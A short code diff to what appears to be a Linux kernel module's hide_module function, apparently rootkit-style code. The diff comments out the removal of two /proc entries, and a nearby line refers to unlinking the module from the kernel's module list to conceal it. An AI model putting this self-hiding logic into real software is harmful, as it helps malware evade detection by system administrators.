@@ -607,13 +607,13 @@ void show_module(void) {
 
 void hide_module(void) {
 #if defined(HIDE_SELF_MODULE)
-    if (is_file_exist("/proc/sched_debug")) {
+ /*   if (is_file_exist("/proc/sched_debug")) {
         remove_proc_entry("sched_debug", NULL);
     }
 
     if (is_file_exist("/proc/uevents_records")) {
         remove_proc_entry("uevents_records", NULL);
-    }
+    }*/
 
 #ifdef MODULE
     // module_previous = THIS_MODULE->list.prev;
